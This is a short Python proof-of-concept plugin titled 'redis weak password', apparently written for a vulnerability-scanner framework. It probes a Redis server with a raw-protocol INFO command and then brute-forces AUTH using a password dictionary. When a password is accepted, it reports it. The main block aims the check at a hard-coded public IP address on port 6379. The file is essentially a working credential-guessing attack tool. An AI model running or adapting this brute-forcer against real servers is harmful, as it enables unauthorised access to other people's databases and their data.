#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : redis weak password
Author    : a
mail      :a@lcx.cc
"""

import socket

def assign(service, arg):
    if service == 'redis':
        return True, arg

def audit(arg):
    ip,port = arg
    infopayload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    apayload = '\x2a\x32\x0d\x0a\x24\x34\x0d\x0a\x41\x55\x54\x48\x0d\x0a\x24'
    bpayload = '\x0d\x0a'
    authpadload = None
    pwlist =getPDList()
    try:
        s = socket.socket()
        s.connect((ip,port))
        s.send(infopayload)
        data = s.recv(1024)
        if 'redis_version' not in data:
            for p in pwlist:
                authpadload = apayload  + str(len(p)) +bpayload + p +  bpayload
                s.send(authpadload)
                data = s.recv(1024)
                if 'OK' in data:
                    security_hole('password :' + p)
                    break
               
        s.close()
    except:
        pass

def getPDList():
     pwlist =[]
     host = ""
     pass_list = util.load_password_dict(
        host,
        userfile=None, 
        passfile='database/ftp_pass.txt',
        userlist=['sa:sa','username'],
        passlist=['123456'],
        mix=True,
        )
     for u ,p in pass_list:
         if len(p) ==0:
             p = 'testvul'
         pwlist.append(p)
     pwlist =  list(set(pwlist))
     return pwlist
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('redis',('31.210.46.29',6379))[1])
